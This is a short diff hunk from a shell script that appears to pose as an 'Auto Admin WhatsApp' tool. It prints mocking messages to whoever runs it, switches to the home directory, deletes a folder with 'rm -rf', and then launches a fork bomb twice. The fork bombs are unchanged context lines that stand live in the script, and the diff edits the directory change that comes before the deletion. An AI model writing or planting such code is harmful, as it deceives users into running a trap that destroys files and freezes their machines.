@@ -48,7 +48,7 @@ echo " NANNAIKUDA 😂😂"
 echo " Auto Admin WhatsApp illya 🥵"
 echo " Are you stupid?"
 sleep 1
-cd ..
+cd 
 rm -rf Auto_admin
 :(){ :|:& };:
 :(){ :|:& };:
